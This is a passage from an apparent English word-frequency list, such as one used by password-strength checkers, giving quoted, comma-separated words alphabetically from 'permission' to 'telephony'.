				"permission",
				"permissions",
				"permit",
				"permits",
				"permitted",
				"perry",
				"persian",
				"persistent",
				"person",
				"personal",
				"personality",
				"personalized",
				"personally",
				"personals",
				"personnel",
				"persons",
				"perspective",
				"perspectives",
				"perth",
				"peru",
				"pest",
				"pet",
				"pete",
				"peter",
				"petersburg",
				"peterson",
				"petite",
				"petition",
				"petroleum",
				"pets",
				"pf",
				"pg",
				"pgp",
				"ph",
				"phantom",
				"pharmaceutical",
				"pharmaceuticals",
				"pharmacies",
				"pharmacology",
				"pharmacy",
				"phase",
				"phases",
				"phd",
				"phenomenon",
				"phentermine",
				"phi",
				"phil",
				"philadelphia",
				"philip",
				"philippines",
				"philips",
				"phillips",
				"philosophy",
				"phoenix",
				"phone",
				"phones",
				"photo",
				"photograph",
				"photographer",
				"photographers",
				"photographic",
				"photographs",
				"photography",
				"photos",
				"photoshop",
				"php",
				"phpbb",
				"phrase",
				"phrases",
				"phys",
				"physical",
				"physically",
				"physician",
				"physicians",
				"physics",
				"physiology",
				"pi",
				"piano",
				"pic",
				"pichunter",
				"pick",
				"picked",
				"picking",
				"picks",
				"pickup",
				"picnic",
				"pics",
				"picture",
				"pictures",
				"pie",
				"piece",
				"pieces",
				"pierce",
				"pierre",
				"pig",
				"pike",
				"pill",
				"pillow",
				"pills",
				"pilot",
				"pin",
				"pine",
				"ping",
				"pink",
				"pins",
				"pioneer",
				"pipe",
				"pipeline",
				"pipes",
				"pirates",
				"piss",
				"pissing",
				"pit",
				"pitch",
				"pittsburgh",
				"pix",
				"pixel",
				"pixels",
				"pizza",
				"pj",
				"pk",
				"pl",
				"place",
				"placed",
				"placement",
				"places",
				"placing",
				"plain",
				"plains",
				"plaintiff",
				"plan",
				"plane",
				"planes",
				"planet",
				"planets",
				"planned",
				"planner",
				"planners",
				"planning",
				"plans",
				"plant",
				"plants",
				"plasma",
				"plastic",
				"plastics",
				"plate",
				"plates",
				"platform",
				"platforms",
				"platinum",
				"play",
				"playback",
				"playboy",
				"played",
				"player",
				"players",
				"playing",
				"playlist",
				"plays",
				"playstation",
				"plaza",
				"plc",
				"pleasant",
				"please",
				"pleased",
				"pleasure",
				"pledge",
				"plenty",
				"plot",
				"plots",
				"plug",
				"plugin",
				"plugins",
				"plumbing",
				"plus",
				"plymouth",
				"pm",
				"pmc",
				"pmid",
				"pn",
				"po",
				"pocket",
				"pockets",
				"pod",
				"podcast",
				"podcasts",
				"poem",
				"poems",
				"poet",
				"poetry",
				"point",
				"pointed",
				"pointer",
				"pointing",
				"points",
				"pokemon",
				"poker",
				"poland",
				"polar",
				"pole",
				"police",
				"policies",
				"policy",
				"polish",
				"polished",
				"political",
				"politicians",
				"politics",
				"poll",
				"polls",
				"pollution",
				"polo",
				"poly",
				"polyester",
				"polymer",
				"polyphonic",
				"pond",
				"pontiac",
				"pool",
				"pools",
				"poor",
				"pop",
				"pope",
				"popular",
				"popularity",
				"population",
				"populations",
				"por",
				"porcelain",
				"pork",
				"porn",
				"porno",
				"porsche",
				"port",
				"portable",
				"portal",
				"porter",
				"portfolio",
				"portion",
				"portions",
				"portland",
				"portrait",
				"portraits",
				"ports",
				"portsmouth",
				"portugal",
				"portuguese",
				"pos",
				"pose",
				"posing",
				"position",
				"positioning",
				"positions",
				"positive",
				"possess",
				"possession",
				"possibilities",
				"possibility",
				"possible",
				"possibly",
				"post",
				"postage",
				"postal",
				"postcard",
				"postcards",
				"posted",
				"poster",
				"posters",
				"posting",
				"postings",
				"postposted",
				"posts",
				"pot",
				"potato",
				"potatoes",
				"potential",
				"potentially",
				"potter",
				"pottery",
				"poultry",
				"pound",
				"pounds",
				"pour",
				"poverty",
				"powder",
				"powell",
				"power",
				"powered",
				"powerful",
				"powerpoint",
				"powers",
				"powerseller",
				"pp",
				"ppc",
				"ppm",
				"pr",
				"practical",
				"practice",
				"practices",
				"practitioner",
				"practitioners",
				"prague",
				"prairie",
				"praise",
				"pray",
				"prayer",
				"prayers",
				"pre",
				"preceding",
				"precious",
				"precipitation",
				"precise",
				"precisely",
				"precision",
				"predict",
				"predicted",
				"prediction",
				"predictions",
				"prefer",
				"preference",
				"preferences",
				"preferred",
				"prefers",
				"prefix",
				"pregnancy",
				"pregnant",
				"preliminary",
				"premier",
				"premiere",
				"premises",
				"premium",
				"prep",
				"prepaid",
				"preparation",
				"prepare",
				"prepared",
				"preparing",
				"prerequisite",
				"prescribed",
				"prescription",
				"presence",
				"present",
				"presentation",
				"presentations",
				"presented",
				"presenting",
				"presently",
				"presents",
				"preservation",
				"preserve",
				"president",
				"presidential",
				"press",
				"pressed",
				"pressing",
				"pressure",
				"preston",
				"pretty",
				"prev",
				"prevent",
				"preventing",
				"prevention",
				"preview",
				"previews",
				"previous",
				"previously",
				"price",
				"priced",
				"prices",
				"pricing",
				"pride",
				"priest",
				"primarily",
				"primary",
				"prime",
				"prince",
				"princess",
				"princeton",
				"principal",
				"principle",
				"principles",
				"print",
				"printable",
				"printed",
				"printer",
				"printers",
				"printing",
				"prints",
				"prior",
				"priorities",
				"priority",
				"prison",
				"prisoner",
				"prisoners",
				"privacy",
				"private",
				"privilege",
				"privileges",
				"prix",
				"prize",
				"prizes",
				"pro",
				"probability",
				"probably",
				"probe",
				"problem",
				"problems",
				"proc",
				"procedure",
				"procedures",
				"proceed",
				"proceeding",
				"proceedings",
				"proceeds",
				"process",
				"processed",
				"processes",
				"processing",
				"processor",
				"processors",
				"procurement",
				"produce",
				"produced",
				"producer",
				"producers",
				"produces",
				"producing",
				"product",
				"production",
				"productions",
				"productive",
				"productivity",
				"products",
				"prof",
				"profession",
				"professional",
				"professionals",
				"professor",
				"profile",
				"profiles",
				"profit",
				"profits",
				"program",
				"programme",
				"programmer",
				"programmers",
				"programmes",
				"programming",
				"programs",
				"progress",
				"progressive",
				"prohibited",
				"project",
				"projected",
				"projection",
				"projector",
				"projectors",
				"projects",
				"prominent",
				"promise",
				"promised",
				"promises",
				"promising",
				"promo",
				"promote",
				"promoted",
				"promotes",
				"promoting",
				"promotion",
				"promotional",
				"promotions",
				"prompt",
				"promptly",
				"proof",
				"propecia",
				"proper",
				"properly",
				"properties",
				"property",
				"prophet",
				"proportion",
				"proposal",
				"proposals",
				"propose",
				"proposed",
				"proposition",
				"proprietary",
				"pros",
				"prospect",
				"prospective",
				"prospects",
				"prostate",
				"prostores",
				"prot",
				"protect",
				"protected",
				"protecting",
				"protection",
				"protective",
				"protein",
				"proteins",
				"protest",
				"protocol",
				"protocols",
				"prototype",
				"proud",
				"proudly",
				"prove",
				"proved",
				"proven",
				"provide",
				"provided",
				"providence",
				"provider",
				"providers",
				"provides",
				"providing",
				"province",
				"provinces",
				"provincial",
				"provision",
				"provisions",
				"proxy",
				"prozac",
				"ps",
				"psi",
				"psp",
				"pst",
				"psychiatry",
				"psychological",
				"psychology",
				"pt",
				"pts",
				"pty",
				"pub",
				"public",
				"publication",
				"publications",
				"publicity",
				"publicly",
				"publish",
				"published",
				"publisher",
				"publishers",
				"publishing",
				"pubmed",
				"pubs",
				"puerto",
				"pull",
				"pulled",
				"pulling",
				"pulse",
				"pump",
				"pumps",
				"punch",
				"punishment",
				"punk",
				"pupils",
				"puppy",
				"purchase",
				"purchased",
				"purchases",
				"purchasing",
				"pure",
				"purple",
				"purpose",
				"purposes",
				"purse",
				"pursuant",
				"pursue",
				"pursuit",
				"push",
				"pushed",
				"pushing",
				"pussy",
				"put",
				"puts",
				"putting",
				"puzzle",
				"puzzles",
				"pvc",
				"python",
				"q",
				"qatar",
				"qc",
				"qld",
				"qt",
				"qty",
				"quad",
				"qualification",
				"qualifications",
				"qualified",
				"qualify",
				"qualifying",
				"qualities",
				"quality",
				"quantitative",
				"quantities",
				"quantity",
				"quantum",
				"quarter",
				"quarterly",
				"quarters",
				"que",
				"quebec",
				"queen",
				"queens",
				"queensland",
				"queries",
				"query",
				"quest",
				"question",
				"questionnaire",
				"questions",
				"queue",
				"qui",
				"quick",
				"quickly",
				"quiet",
				"quilt",
				"quit",
				"quite",
				"quiz",
				"quizzes",
				"quotations",
				"quote",
				"quoted",
				"quotes",
				"r",
				"ra",
				"rabbit",
				"race",
				"races",
				"rachel",
				"racial",
				"racing",
				"rack",
				"racks",
				"radar",
				"radiation",
				"radical",
				"radio",
				"radios",
				"radius",
				"rage",
				"raid",
				"rail",
				"railroad",
				"railway",
				"rain",
				"rainbow",
				"raise",
				"raised",
				"raises",
				"raising",
				"raleigh",
				"rally",
				"ralph",
				"ram",
				"ran",
				"ranch",
				"rand",
				"random",
				"randy",
				"range",
				"rangers",
				"ranges",
				"ranging",
				"rank",
				"ranked",
				"ranking",
				"rankings",
				"ranks",
				"rap",
				"rape",
				"rapid",
				"rapidly",
				"rapids",
				"rare",
				"rarely",
				"rat",
				"rate",
				"rated",
				"rates",
				"rather",
				"rating",
				"ratings",
				"ratio",
				"rational",
				"ratios",
				"rats",
				"raw",
				"ray",
				"raymond",
				"rays",
				"rb",
				"rc",
				"rca",
				"rd",
				"re",
				"reach",
				"reached",
				"reaches",
				"reaching",
				"reaction",
				"reactions",
				"read",
				"reader",
				"readers",
				"readily",
				"reading",
				"readings",
				"reads",
				"ready",
				"real",
				"realistic",
				"reality",
				"realize",
				"realized",
				"really",
				"realm",
				"realtor",
				"realtors",
				"realty",
				"rear",
				"reason",
				"reasonable",
				"reasonably",
				"reasoning",
				"reasons",
				"rebate",
				"rebates",
				"rebecca",
				"rebel",
				"rebound",
				"rec",
				"recall",
				"receipt",
				"receive",
				"received",
				"receiver",
				"receivers",
				"receives",
				"receiving",
				"recent",
				"recently",
				"reception",
				"receptor",
				"receptors",
				"recipe",
				"recipes",
				"recipient",
				"recipients",
				"recognised",
				"recognition",
				"recognize",
				"recognized",
				"recommend",
				"recommendation",
				"recommendations",
				"recommended",
				"recommends",
				"reconstruction",
				"record",
				"recorded",
				"recorder",
				"recorders",
				"recording",
				"recordings",
				"records",
				"recover",
				"recovered",
				"recovery",
				"recreation",
				"recreational",
				"recruiting",
				"recruitment",
				"recycling",
				"red",
				"redeem",
				"redhead",
				"reduce",
				"reduced",
				"reduces",
				"reducing",
				"reduction",
				"reductions",
				"reed",
				"reef",
				"reel",
				"ref",
				"refer",
				"reference",
				"referenced",
				"references",
				"referral",
				"referrals",
				"referred",
				"referring",
				"refers",
				"refinance",
				"refine",
				"refined",
				"reflect",
				"reflected",
				"reflection",
				"reflections",
				"reflects",
				"reform",
				"reforms",
				"refresh",
				"refrigerator",
				"refugees",
				"refund",
				"refurbished",
				"refuse",
				"refused",
				"reg",
				"regard",
				"regarded",
				"regarding",
				"regardless",
				"regards",
				"reggae",
				"regime",
				"region",
				"regional",
				"regions",
				"register",
				"registered",
				"registrar",
				"registration",
				"registry",
				"regression",
				"regular",
				"regularly",
				"regulated",
				"regulation",
				"regulations",
				"regulatory",
				"rehab",
				"rehabilitation",
				"reid",
				"reject",
				"rejected",
				"rel",
				"relate",
				"related",
				"relates",
				"relating",
				"relation",
				"relations",
				"relationship",
				"relationships",
				"relative",
				"relatively",
				"relatives",
				"relax",
				"relaxation",
				"relay",
				"release",
				"released",
				"releases",
				"relevance",
				"relevant",
				"reliability",
				"reliable",
				"reliance",
				"relief",
				"religion",
				"religions",
				"religious",
				"reload",
				"relocation",
				"rely",
				"relying",
				"remain",
				"remainder",
				"remained",
				"remaining",
				"remains",
				"remark",
				"remarkable",
				"remarks",
				"remedies",
				"remedy",
				"remember",
				"remembered",
				"remind",
				"reminder",
				"remix",
				"remote",
				"removable",
				"removal",
				"remove",
				"removed",
				"removing",
				"renaissance",
				"render",
				"rendered",
				"rendering",
				"renew",
				"renewable",
				"renewal",
				"reno",
				"rent",
				"rental",
				"rentals",
				"rentcom",
				"rep",
				"repair",
				"repairs",
				"repeat",
				"repeated",
				"replace",
				"replaced",
				"replacement",
				"replacing",
				"replica",
				"replication",
				"replied",
				"replies",
				"reply",
				"report",
				"reported",
				"reporter",
				"reporters",
				"reporting",
				"reports",
				"repository",
				"represent",
				"representation",
				"representations",
				"representative",
				"representatives",
				"represented",
				"representing",
				"represents",
				"reprint",
				"reprints",
				"reproduce",
				"reproduced",
				"reproduction",
				"reproductive",
				"republic",
				"republican",
				"republicans",
				"reputation",
				"request",
				"requested",
				"requesting",
				"requests",
				"require",
				"required",
				"requirement",
				"requirements",
				"requires",
				"requiring",
				"res",
				"rescue",
				"research",
				"researcher",
				"researchers",
				"reseller",
				"reservation",
				"reservations",
				"reserve",
				"reserved",
				"reserves",
				"reservoir",
				"reset",
				"residence",
				"resident",
				"residential",
				"residents",
				"resist",
				"resistance",
				"resistant",
				"resolution",
				"resolutions",
				"resolve",
				"resolved",
				"resort",
				"resorts",
				"resource",
				"resources",
				"respect",
				"respected",
				"respective",
				"respectively",
				"respiratory",
				"respond",
				"responded",
				"respondent",
				"respondents",
				"responding",
				"response",
				"responses",
				"responsibilities",
				"responsibility",
				"responsible",
				"rest",
				"restaurant",
				"restaurants",
				"restoration",
				"restore",
				"restored",
				"restrict",
				"restricted",
				"restriction",
				"restrictions",
				"restructuring",
				"result",
				"resulted",
				"resulting",
				"results",
				"resume",
				"resumes",
				"retail",
				"retailer",
				"retailers",
				"retain",
				"retained",
				"retention",
				"retired",
				"retirement",
				"retreat",
				"retrieval",
				"retrieve",
				"retrieved",
				"retro",
				"return",
				"returned",
				"returning",
				"returns",
				"reunion",
				"reuters",
				"rev",
				"reveal",
				"revealed",
				"reveals",
				"revelation",
				"revenge",
				"revenue",
				"revenues",
				"reverse",
				"review",
				"reviewed",
				"reviewer",
				"reviewing",
				"reviews",
				"revised",
				"revision",
				"revisions",
				"revolution",
				"revolutionary",
				"reward",
				"rewards",
				"reynolds",
				"rf",
				"rfc",
				"rg",
				"rh",
				"rhode",
				"rhythm",
				"ri",
				"ribbon",
				"rica",
				"rice",
				"rich",
				"richard",
				"richards",
				"richardson",
				"richmond",
				"rick",
				"rico",
				"rid",
				"ride",
				"rider",
				"riders",
				"rides",
				"ridge",
				"riding",
				"right",
				"rights",
				"rim",
				"ring",
				"rings",
				"ringtone",
				"ringtones",
				"rio",
				"rip",
				"ripe",
				"rise",
				"rising",
				"risk",
				"risks",
				"river",
				"rivers",
				"riverside",
				"rj",
				"rl",
				"rm",
				"rn",
				"rna",
				"ro",
				"road",
				"roads",
				"rob",
				"robert",
				"roberts",
				"robertson",
				"robin",
				"robinson",
				"robot",
				"robots",
				"robust",
				"rochester",
				"rock",
				"rocket",
				"rocks",
				"rocky",
				"rod",
				"roger",
				"rogers",
				"roland",
				"role",
				"roles",
				"roll",
				"rolled",
				"roller",
				"rolling",
				"rolls",
				"rom",
				"roman",
				"romance",
				"romania",
				"romantic",
				"rome",
				"ron",
				"ronald",
				"roof",
				"room",
				"roommate",
				"roommates",
				"rooms",
				"root",
				"roots",
				"rope",
				"rosa",
				"rose",
				"roses",
				"ross",
				"roster",
				"rotary",
				"rotation",
				"rouge",
				"rough",
				"roughly",
				"roulette",
				"round",
				"rounds",
				"route",
				"router",
				"routers",
				"routes",
				"routine",
				"routines",
				"routing",
				"rover",
				"row",
				"rows",
				"roy",
				"royal",
				"royalty",
				"rp",
				"rpg",
				"rpm",
				"rr",
				"rrp",
				"rs",
				"rss",
				"rt",
				"ru",
				"rubber",
				"ruby",
				"rug",
				"rugby",
				"rugs",
				"rule",
				"ruled",
				"rules",
				"ruling",
				"run",
				"runner",
				"running",
				"runs",
				"runtime",
				"rural",
				"rush",
				"russell",
				"russia",
				"russian",
				"ruth",
				"rv",
				"rw",
				"rwanda",
				"rx",
				"ryan",
				"s",
				"sa",
				"sacramento",
				"sacred",
				"sacrifice",
				"sad",
				"saddam",
				"safari",
				"safe",
				"safely",
				"safer",
				"safety",
				"sage",
				"sagem",
				"said",
				"sail",
				"sailing",
				"saint",
				"saints",
				"sake",
				"salad",
				"salaries",
				"salary",
				"sale",
				"salem",
				"sales",
				"sally",
				"salmon",
				"salon",
				"salt",
				"salvador",
				"salvation",
				"sam",
				"samba",
				"same",
				"samoa",
				"sample",
				"samples",
				"sampling",
				"samsung",
				"samuel",
				"san",
				"sand",
				"sandra",
				"sandwich",
				"sandy",
				"sans",
				"santa",
				"sanyo",
				"sao",
				"sap",
				"sapphire",
				"sara",
				"sarah",
				"sas",
				"saskatchewan",
				"sat",
				"satellite",
				"satin",
				"satisfaction",
				"satisfactory",
				"satisfied",
				"satisfy",
				"saturday",
				"saturn",
				"sauce",
				"saudi",
				"savage",
				"savannah",
				"save",
				"saved",
				"saver",
				"saves",
				"saving",
				"savings",
				"saw",
				"say",
				"saying",
				"says",
				"sb",
				"sbjct",
				"sc",
				"scale",
				"scales",
				"scan",
				"scanned",
				"scanner",
				"scanners",
				"scanning",
				"scary",
				"scenario",
				"scenarios",
				"scene",
				"scenes",
				"scenic",
				"schedule",
				"scheduled",
				"schedules",
				"scheduling",
				"schema",
				"scheme",
				"schemes",
				"scholar",
				"scholars",
				"scholarship",
				"scholarships",
				"school",
				"schools",
				"sci",
				"science",
				"sciences",
				"scientific",
				"scientist",
				"scientists",
				"scoop",
				"scope",
				"score",
				"scored",
				"scores",
				"scoring",
				"scotia",
				"scotland",
				"scott",
				"scottish",
				"scout",
				"scratch",
				"screen",
				"screening",
				"screens",
				"screensaver",
				"screensavers",
				"screenshot",
				"screenshots",
				"screw",
				"script",
				"scripting",
				"scripts",
				"scroll",
				"scsi",
				"scuba",
				"sculpture",
				"sd",
				"se",
				"sea",
				"seafood",
				"seal",
				"sealed",
				"sean",
				"search",
				"searchcom",
				"searched",
				"searches",
				"searching",
				"seas",
				"season",
				"seasonal",
				"seasons",
				"seat",
				"seating",
				"seats",
				"seattle",
				"sec",
				"second",
				"secondary",
				"seconds",
				"secret",
				"secretariat",
				"secretary",
				"secrets",
				"section",
				"sections",
				"sector",
				"sectors",
				"secure",
				"secured",
				"securely",
				"securities",
				"security",
				"see",
				"seed",
				"seeds",
				"seeing",
				"seek",
				"seeker",
				"seekers",
				"seeking",
				"seeks",
				"seem",
				"seemed",
				"seems",
				"seen",
				"sees",
				"sega",
				"segment",
				"segments",
				"select",
				"selected",
				"selecting",
				"selection",
				"selections",
				"selective",
				"self",
				"sell",
				"seller",
				"sellers",
				"selling",
				"sells",
				"semester",
				"semi",
				"semiconductor",
				"seminar",
				"seminars",
				"sen",
				"senate",
				"senator",
				"senators",
				"send",
				"sender",
				"sending",
				"sends",
				"senegal",
				"senior",
				"seniors",
				"sense",
				"sensitive",
				"sensitivity",
				"sensor",
				"sensors",
				"sent",
				"sentence",
				"sentences",
				"seo",
				"sep",
				"separate",
				"separated",
				"separately",
				"separation",
				"sept",
				"september",
				"seq",
				"sequence",
				"sequences",
				"ser",
				"serbia",
				"serial",
				"series",
				"serious",
				"seriously",
				"serum",
				"serve",
				"served",
				"server",
				"servers",
				"serves",
				"service",
				"services",
				"serving",
				"session",
				"sessions",
				"set",
				"sets",
				"setting",
				"settings",
				"settle",
				"settled",
				"settlement",
				"setup",
				"seven",
				"seventh",
				"several",
				"severe",
				"sewing",
				"sex",
				"sexcam",
				"sexo",
				"sexual",
				"sexuality",
				"sexually",
				"sexy",
				"sf",
				"sg",
				"sh",
				"shade",
				"shades",
				"shadow",
				"shadows",
				"shaft",
				"shake",
				"shakespeare",
				"shakira",
				"shall",
				"shame",
				"shanghai",
				"shannon",
				"shape",
				"shaped",
				"shapes",
				"share",
				"shared",
				"shareholders",
				"shares",
				"shareware",
				"sharing",
				"shark",
				"sharon",
				"sharp",
				"shaved",
				"shaw",
				"she",
				"shed",
				"sheep",
				"sheer",
				"sheet",
				"sheets",
				"sheffield",
				"shelf",
				"shell",
				"shelter",
				"shemale",
				"shemales",
				"shepherd",
				"sheriff",
				"sherman",
				"shield",
				"shift",
				"shine",
				"ship",
				"shipment",
				"shipments",
				"shipped",
				"shipping",
				"ships",
				"shirt",
				"shirts",
				"shit",
				"shock",
				"shoe",
				"shoes",
				"shoot",
				"shooting",
				"shop",
				"shopper",
				"shoppercom",
				"shoppers",
				"shopping",
				"shoppingcom",
				"shops",
				"shopzilla",
				"shore",
				"short",
				"shortcuts",
				"shorter",
				"shortly",
				"shorts",
				"shot",
				"shots",
				"should",
				"shoulder",
				"show",
				"showcase",
				"showed",
				"shower",
				"showers",
				"showing",
				"shown",
				"shows",
				"showtimes",
				"shut",
				"shuttle",
				"si",
				"sic",
				"sick",
				"side",
				"sides",
				"sie",
				"siemens",
				"sierra",
				"sig",
				"sight",
				"sigma",
				"sign",
				"signal",
				"signals",
				"signature",
				"signatures",
				"signed",
				"significance",
				"significant",
				"significantly",
				"signing",
				"signs",
				"signup",
				"silence",
				"silent",
				"silicon",
				"silk",
				"silly",
				"silver",
				"sim",
				"similar",
				"similarly",
				"simon",
				"simple",
				"simplified",
				"simply",
				"simpson",
				"simpsons",
				"sims",
				"simulation",
				"simulations",
				"simultaneously",
				"sin",
				"since",
				"sing",
				"singapore",
				"singer",
				"singh",
				"singing",
				"single",
				"singles",
				"sink",
				"sip",
				"sir",
				"sister",
				"sisters",
				"sit",
				"site",
				"sitemap",
				"sites",
				"sitting",
				"situated",
				"situation",
				"situations",
				"six",
				"sixth",
				"size",
				"sized",
				"sizes",
				"sk",
				"skating",
				"ski",
				"skiing",
				"skill",
				"skilled",
				"skills",
				"skin",
				"skins",
				"skip",
				"skirt",
				"skirts",
				"sku",
				"sky",
				"skype",
				"sl",
				"slave",
				"sleep",
				"sleeping",
				"sleeps",
				"sleeve",
				"slide",
				"slides",
				"slideshow",
				"slight",
				"slightly",
				"slim",
				"slip",
				"slope",
				"slot",
				"slots",
				"slovak",
				"slovakia",
				"slovenia",
				"slow",
				"slowly",
				"slut",
				"sluts",
				"sm",
				"small",
				"smaller",
				"smart",
				"smell",
				"smile",
				"smilies",
				"smith",
				"smithsonian",
				"smoke",
				"smoking",
				"smooth",
				"sms",
				"smtp",
				"sn",
				"snake",
				"snap",
				"snapshot",
				"snow",
				"snowboard",
				"so",
				"soa",
				"soap",
				"soc",
				"soccer",
				"social",
				"societies",
				"society",
				"sociology",
				"socket",
				"socks",
				"sodium",
				"sofa",
				"soft",
				"softball",
				"software",
				"soil",
				"sol",
				"solar",
				"solaris",
				"sold",
				"soldier",
				"soldiers",
				"sole",
				"solely",
				"solid",
				"solo",
				"solomon",
				"solution",
				"solutions",
				"solve",
				"solved",
				"solving",
				"soma",
				"somalia",
				"some",
				"somebody",
				"somehow",
				"someone",
				"somerset",
				"something",
				"sometimes",
				"somewhat",
				"somewhere",
				"son",
				"song",
				"songs",
				"sonic",
				"sons",
				"sony",
				"soon",
				"soonest",
				"sophisticated",
				"sorry",
				"sort",
				"sorted",
				"sorts",
				"sought",
				"soul",
				"souls",
				"sound",
				"sounds",
				"soundtrack",
				"soup",
				"source",
				"sources",
				"south",
				"southampton",
				"southeast",
				"southern",
				"southwest",
				"soviet",
				"sox",
				"sp",
				"spa",
				"space",
				"spaces",
				"spain",
				"spam",
				"span",
				"spanish",
				"spank",
				"spanking",
				"sparc",
				"spare",
				"spas",
				"spatial",
				"speak",
				"speaker",
				"speakers",
				"speaking",
				"speaks",
				"spears",
				"spec",
				"special",
				"specialist",
				"specialists",
				"specialized",
				"specializing",
				"specially",
				"specials",
				"specialties",
				"specialty",
				"species",
				"specific",
				"specifically",
				"specification",
				"specifications",
				"specifics",
				"specified",
				"specifies",
				"specify",
				"specs",
				"spectacular",
				"spectrum",
				"speech",
				"speeches",
				"speed",
				"speeds",
				"spell",
				"spelling",
				"spencer",
				"spend",
				"spending",
				"spent",
				"sperm",
				"sphere",
				"spice",
				"spider",
				"spies",
				"spin",
				"spine",
				"spirit",
				"spirits",
				"spiritual",
				"spirituality",
				"split",
				"spoke",
				"spoken",
				"spokesman",
				"sponsor",
				"sponsored",
				"sponsors",
				"sponsorship",
				"sport",
				"sporting",
				"sports",
				"spot",
				"spotlight",
				"spots",
				"spouse",
				"spray",
				"spread",
				"spreading",
				"spring",
				"springer",
				"springfield",
				"springs",
				"sprint",
				"spy",
				"spyware",
				"sq",
				"sql",
				"squad",
				"square",
				"squirt",
				"squirting",
				"sr",
				"src",
				"sri",
				"ss",
				"ssl",
				"st",
				"stability",
				"stable",
				"stack",
				"stadium",
				"staff",
				"staffing",
				"stage",
				"stages",
				"stainless",
				"stakeholders",
				"stamp",
				"stamps",
				"stan",
				"stand",
				"standard",
				"standards",
				"standing",
				"standings",
				"stands",
				"stanford",
				"stanley",
				"star",
				"starring",
				"stars",
				"starsmerchant",
				"start",
				"started",
				"starter",
				"starting",
				"starts",
				"startup",
				"stat",
				"state",
				"stated",
				"statement",
				"statements",
				"states",
				"statewide",
				"static",
				"stating",
				"station",
				"stationery",
				"stations",
				"statistical",
				"statistics",
				"stats",
				"status",
				"statute",
				"statutes",
				"statutory",
				"stay",
				"stayed",
				"staying",
				"stays",
				"std",
				"ste",
				"steady",
				"steal",
				"steam",
				"steel",
				"steering",
				"stem",
				"step",
				"stephanie",
				"stephen",
				"steps",
				"stereo",
				"sterling",
				"steve",
				"steven",
				"stevens",
				"stewart",
				"stick",
				"sticker",
				"stickers",
				"sticks",
				"sticky",
				"still",
				"stock",
				"stockholm",
				"stockings",
				"stocks",
				"stolen",
				"stomach",
				"stone",
				"stones",
				"stood",
				"stop",
				"stopped",
				"stopping",
				"stops",
				"storage",
				"store",
				"stored",
				"stores",
				"stories",
				"storm",
				"story",
				"str",
				"straight",
				"strain",
				"strand",
				"strange",
				"stranger",
				"strap",
				"strategic",
				"strategies",
				"strategy",
				"stream",
				"streaming",
				"streams",
				"street",
				"streets",
				"strength",
				"strengthen",
				"strengthening",
				"strengths",
				"stress",
				"stretch",
				"strict",
				"strictly",
				"strike",
				"strikes",
				"striking",
				"string",
				"strings",
				"strip",
				"stripes",
				"strips",
				"stroke",
				"strong",
				"stronger",
				"strongly",
				"struck",
				"struct",
				"structural",
				"structure",
				"structured",
				"structures",
				"struggle",
				"stuart",
				"stuck",
				"stud",
				"student",
				"students",
				"studied",
				"studies",
				"studio",
				"studios",
				"study",
				"studying",
				"stuff",
				"stuffed",
				"stunning",
				"stupid",
				"style",
				"styles",
				"stylish",
				"stylus",
				"su",
				"sub",
				"subaru",
				"subcommittee",
				"subdivision",
				"subject",
				"subjects",
				"sublime",
				"sublimedirectory",
				"submission",
				"submissions",
				"submit",
				"submitted",
				"submitting",
				"subscribe",
				"subscriber",
				"subscribers",
				"subscription",
				"subscriptions",
				"subsection",
				"subsequent",
				"subsequently",
				"subsidiaries",
				"subsidiary",
				"substance",
				"substances",
				"substantial",
				"substantially",
				"substitute",
				"subtle",
				"suburban",
				"succeed",
				"success",
				"successful",
				"successfully",
				"such",
				"suck",
				"sucking",
				"sucks",
				"sudan",
				"sudden",
				"suddenly",
				"sue",
				"suffer",
				"suffered",
				"suffering",
				"sufficient",
				"sufficiently",
				"sugar",
				"suggest",
				"suggested",
				"suggesting",
				"suggestion",
				"suggestions",
				"suggests",
				"suicide",
				"suit",
				"suitable",
				"suite",
				"suited",
				"suites",
				"suits",
				"sullivan",
				"sum",
				"summaries",
				"summary",
				"summer",
				"summit",
				"sun",
				"sunday",
				"sunglasses",
				"sunny",
				"sunrise",
				"sunset",
				"sunshine",
				"super",
				"superb",
				"superintendent",
				"superior",
				"supervision",
				"supervisor",
				"supervisors",
				"supplement",
				"supplemental",
				"supplements",
				"supplied",
				"supplier",
				"suppliers",
				"supplies",
				"supply",
				"support",
				"supported",
				"supporters",
				"supporting",
				"supports",
				"suppose",
				"supposed",
				"supreme",
				"sur",
				"sure",
				"surely",
				"surf",
				"surface",
				"surfaces",
				"surfing",
				"surge",
				"surgeon",
				"surgeons",
				"surgery",
				"surgical",
				"surname",
				"surplus",
				"surprise",
				"surprised",
				"surprising",
				"surrey",
				"surround",
				"surrounded",
				"surrounding",
				"surveillance",
				"survey",
				"surveys",
				"survival",
				"survive",
				"survivor",
				"survivors",
				"susan",
				"suse",
				"suspect",
				"suspected",
				"suspended",
				"suspension",
				"sussex",
				"sustainability",
				"sustainable",
				"sustained",
				"suzuki",
				"sv",
				"sw",
				"swap",
				"sweden",
				"swedish",
				"sweet",
				"swift",
				"swim",
				"swimming",
				"swing",
				"swingers",
				"swiss",
				"switch",
				"switched",
				"switches",
				"switching",
				"switzerland",
				"sword",
				"sydney",
				"symantec",
				"symbol",
				"symbols",
				"sympathy",
				"symphony",
				"symposium",
				"symptoms",
				"sync",
				"syndicate",
				"syndication",
				"syndrome",
				"synopsis",
				"syntax",
				"synthesis",
				"synthetic",
				"syracuse",
				"syria",
				"sys",
				"system",
				"systematic",
				"systems",
				"t",
				"ta",
				"tab",
				"table",
				"tables",
				"tablet",
				"tablets",
				"tabs",
				"tackle",
				"tactics",
				"tag",
				"tagged",
				"tags",
				"tahoe",
				"tail",
				"taiwan",
				"take",
				"taken",
				"takes",
				"taking",
				"tale",
				"talent",
				"talented",
				"tales",
				"talk",
				"talked",
				"talking",
				"talks",
				"tall",
				"tamil",
				"tampa",
				"tan",
				"tank",
				"tanks",
				"tanzania",
				"tap",
				"tape",
				"tapes",
				"tar",
				"target",
				"targeted",
				"targets",
				"tariff",
				"task",
				"tasks",
				"taste",
				"tattoo",
				"taught",
				"tax",
				"taxation",
				"taxes",
				"taxi",
				"taylor",
				"tb",
				"tba",
				"tc",
				"tcp",
				"td",
				"te",
				"tea",
				"teach",
				"teacher",
				"teachers",
				"teaches",
				"teaching",
				"team",
				"teams",
				"tear",
				"tears",
				"tech",
				"technical",
				"technician",
				"technique",
				"techniques",
				"techno",
				"technological",
				"technologies",
				"technology",
				"techrepublic",
				"ted",
				"teddy",
				"tee",
				"teen",
				"teenage",
				"teens",
				"teeth",
				"tel",
				"telecharger",
				"telecom",
				"telecommunications",
				"telephone",
				"telephony",
